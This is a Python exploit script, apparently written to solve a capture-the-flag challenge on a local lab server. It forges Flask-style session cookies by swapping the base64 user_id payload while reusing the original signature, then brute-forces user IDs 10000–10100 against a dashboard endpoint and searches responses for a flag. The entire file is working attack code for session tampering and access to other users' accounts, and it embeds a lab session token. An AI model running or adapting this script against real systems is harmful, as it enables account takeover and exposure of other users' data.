import base64
import json
import requests
import re
import sys

# Configuration
BASE_URL = "http://127.0.0.1:33187"
VALID_SESSION = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

# Headers
headers = {'User-Agent': 'Mozilla/5.0'}

print(f"[*] Starting user ID brute force (10000-10100)")
print(f"[*] Testing against: {BASE_URL}/dashboard")
print()

found_flag = None
total_tested = 0
total_success = 0
total_failed = 0

for user_id in range(10000, 10101):
    total_tested += 1
    
    try:
        # Create modified session cookie
        parts = VALID_SESSION.split('.')
        new_payload = {"user_id": str(user_id)}
        payload_json = json.dumps(new_payload, separators=(',', ':'))
        new_payload_b64 = base64.b64encode(payload_json.encode()).decode('utf-8')
        modified_cookie = f"{new_payload_b64}.{parts[1]}.{parts[2]}"
        
        # Send request
        response = requests.get(
            f"{BASE_URL}/dashboard",
            headers=headers,
            cookies={'session': modified_cookie},
            timeout=10
        )
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            found_flag = flag_match.group(0)
            print(f"[!] FLAG FOUND at user_id={user_id}")
            print(f"[!] FLAG: {found_flag}")
            print(f"[!] Response: {response.text[:500]}")
            break
        
        # Count successful requests (non-4xx)
        if response.status_code < 400:
            total_success += 1
        else:
            total_failed += 1
            
        # Progress every 10
        if user_id % 10 == 0:
            print(f"[*] Progress: tested up to {user_id}, successes: {total_success}, failures: {total_failed}")
            
    except Exception as e:
        print(f"[!] Error at user_id {user_id}: {e}")
        total_failed += 1

print()
print("="*50)
if found_flag:
    print(f"[SUCCESS] Found flag: {found_flag}")
else:
    print(f"[-] No flag found after testing {total_tested} user IDs")
    print(f"Results: {total_success} successes, {total_failed} failures")
print("="*50)
